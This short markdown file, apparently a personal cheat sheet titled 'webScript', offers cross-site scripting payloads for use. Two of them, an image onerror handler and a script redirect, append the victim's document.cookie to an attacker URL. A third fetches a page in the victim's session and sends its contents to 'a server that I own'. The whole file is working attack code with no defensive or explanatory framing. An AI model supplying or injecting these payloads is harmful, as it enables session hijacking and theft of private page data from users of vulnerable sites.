# webScript

## Want to steal cookie ? 
Try this:
```js
<img src="" onerror="this.src='[URL]?cookie='+document.cookie;"></img>
```
```js
<script>document.location='[URL]?c='+document.cookie</script>
```

## Want to know how other see some page?
```js
<script>
fetch("[URL-PAGE TO BE STOLEN]")
.then((result) => { return result.text(); })
.then((content) => {
    fetch('[URL-SERVER THAT I OWN ]?c='+content)
    ; }); 
</script>
```
